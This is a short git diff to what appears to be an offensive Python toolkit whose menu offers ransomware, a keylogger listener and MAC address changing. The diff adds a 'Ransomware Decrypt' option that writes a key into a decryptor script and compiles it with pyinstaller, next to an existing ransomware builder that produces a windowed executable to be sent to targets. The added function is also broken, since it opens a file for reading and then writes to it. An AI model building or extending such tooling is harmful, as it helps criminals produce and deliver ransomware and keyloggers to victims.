@@ -21,6 +21,7 @@ a = """
 9-)Ransomware  !!!(not decrypted for now)!!!
 10-)Changemac
 11-)Keylogger Listener
+12-)Ransomware Decrypt
 example: use 1
 
 """
@@ -104,12 +105,23 @@ def Ransomware():
         file.write(a)
     sb.call(["pyinstaller","--onefile","-w","Ransomware/Ransomware.py"])
 
+def Ransomware_decrypt():
+    key = input("enter decrypt key: ")
+    with open("Ransomware/ransom_decrypted.py","r") as file:
+        a=file.read()
+        a=a.replace("1122",key)
+    with open("Ransomware/ransom_decrypted.py","r") as file:
+        file.write(a)
+    sb.call(["pyinstaller","--onefile","-w","Ransomware/ransom_decrypted.py"])
+
 while True:
     print(a)
     user_input = input("input:")
     try:
         if  user_input == 'use 10':
             change_mac()
+        elif user_input == 'use 12':
+            Ransomware_decrypt()
         elif user_input == 'use 9':
             Ransomware()
             print("after send .exe extansion file open listener send commannd '1'")
